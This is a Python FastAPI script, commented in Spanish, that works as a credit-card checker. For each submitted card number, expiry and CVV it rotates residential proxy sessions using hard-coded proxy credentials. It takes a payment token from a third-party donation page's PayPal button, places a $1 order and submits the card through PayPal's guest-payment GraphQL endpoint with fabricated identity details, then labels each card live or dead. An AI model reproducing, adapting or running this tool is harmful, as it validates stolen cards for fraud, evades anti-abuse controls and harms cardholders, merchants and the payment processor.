import httpx
import asyncio
import random
import string
import uvicorn
from fastapi import FastAPI
from colorama import Fore, init
from html import unescape

init(autoreset=True)
app = FastAPI()

# === CONFIGURACIÓN IPROYAL ===

USER = "o1CK8doqxzS9ENdO"
PASS_BASE = "ewwKtN9UnwgSnWnV_country-us"

def get_session_id():
    # Genera un ID de sesión único para rotar IP en cada petición
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def capture(string, start, end):
    try:
        s = string.find(start)
        if s == -1: return None
        s += len(start)
        e = string.find(end, s)
        return string[s:e]
    except: return None

@app.get("/check")
async def check_card(cc: str, mm: str, aa: str, cvv: str):
    session_id = get_session_id()
    # Construcción de la URL de IPRoyal con rotación por sesión
    proxy_url = f"http://{USER}:{PASS_BASE}_session-{session_id}@geo.iproyal.com:11200"
    
    print(f"{Fore.CYAN}🔎 Probando con IPRoyal: {cc}|{mm}|{aa}|{cvv} (Session: {session_id})")
    
    head_base = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "x-app-name": "hermione",
        "Origin": "https://www.paypal.com",
        "Referer": "https://onehealthworkforceacademies.org/"
    }

    # Iniciamos sesión con el proxy de IPRoyal
    async with httpx.AsyncClient(proxy=proxy_url, verify=False, timeout=40.0) as session:
        try:
            # PASO 1: Obtener Token Facilitador
            url_sdk = "https://www.paypal.com/smart/buttons?style.label=donate&sdkVersion=5.0.390&clientID=Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh&env=production&currency=USD&intent=capture"
            r = await session.get(url_sdk, headers=head_base)
            token = capture(r.text, '"facilitatorAccessToken":"', '"')
            
            if not token:
                print(f"{Fore.RED}❌ Proxy Error o IP Bloqueada (No Token)")
                return {"status": "error", "msg": "IP_BANNED_OR_PROXY_FAIL"}
            
            token = unescape(token.strip())

            # PASO 2: Crear Orden
            head2 = {**head_base, "Authorization": f"Bearer {token}", "Content-Type": "application/json"}
            post2 = {"purchase_units": [{"amount": {"currency_code": "USD", "value": "1"}}], "intent": "CAPTURE"}
            r2 = await session.post("https://www.paypal.com/v2/checkout/orders", headers=head2, json=post2)
            order_id = capture(r2.text, '"id":"', '"')

            if not order_id:
                print(f"{Fore.RED}❌ Falló creación de Orden")
                return {"status": "dead", "msg": "ORDER_FAILED"}

            # --- DELAY HUMANO ---
            print(f"{Fore.YELLOW}⏳ Esperando validación de PayPal...")
            await asyncio.sleep(random.uniform(5, 8))

            # PASO 3: GraphQL (Pago Final)
            head3 = {
                **head_base, 
                "Content-Type": "application/json", 
                "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}"
            }
            
            direccion_fija = {
                "givenName": "Marsa", "familyName": "Oasa",
                "line1": "11sff e8 W 132asffn33d St", "city": "New York", "state": "NY", "postalCode": "10028", "country": "US"
            }

            email_random = f"marviaosoaef{random.randint(1000, 9999)}@gmail.com"
            phone_random = f"917{random.randint(2000000, 9999999)}"

            graphql_payload = {
                "query": "mutation payWithCard($token: String!, $card: CardInput!, $billingAddress: AddressInput, $shippingAddress: AddressInput, $firstName: String, $lastName: String, $email: String, $phoneNumber: String) { approveGuestPaymentWithCreditCard(token: $token, card: $card, billingAddress: $billingAddress, shippingAddress: $shippingAddress, firstName: $firstName, lastName: $lastName, email: $email, phoneNumber: $phoneNumber) { flags { is3DSecureRequired } cart { intent cartId } } }",
                "variables": {
                    "token": order_id,
                    "card": {
                        "cardNumber": cc, 
                        "expirationDate": f"{mm}/{aa}", 
                        "securityCode": cvv, 
                        "postalCode": "10027"
                    },
                    "firstName": "Marvin",
                    "lastName": "Dev",
                    "email": email_random,
                    "phoneNumber": phone_random,
                    "billingAddress": direccion_fija,
                    "shippingAddress": direccion_fija
                }
            }

            r3 = await session.post("https://www.paypal.com/graphql", headers=head3, json=graphql_payload)
            res_text = r3.text

            err_code = capture(res_text, '"code":"', '"')
            # --- DEBUG LOG ---
            print(f"{Fore.MAGENTA}--- RESPUESTA PAYPAL ---")
            print(res_text[:500] + "...") 
            print(f"{Fore.MAGENTA}------------------------")

            if "is3DSecureRequired" in err_code or "APPROVE_GUEST_PAYMENT_COMPLETED" in res_text:
                print(f"{Fore.GREEN}✅ LIVE: {cc}")
                return {"status": "approved", "msg": "CHARGED 1$ ✅"}
            
            elif "is3DSecureRequired" in err_code or "INVALID_SECURITY_CODE" in res_text:
                print(f"{Fore.GREEN}✅ LIVE: {cc}")
                return {"status": "approved", "msg": "INVALID SECURITY CODE ✅"}


            else:
            
                print(f"{Fore.RED}❌ DEAD: {err_code}")
                return {"status": "dead", "msg": f"card: {err_code}", "raw": res_text[:150]}
        
            # Clasificación de error
            
            
            

            

        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Error de Red/Proxy: {str(e)[:50]}")
            return {"status": "error", "msg": "PROXY_OR_CONN_TIMEOUT"}

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)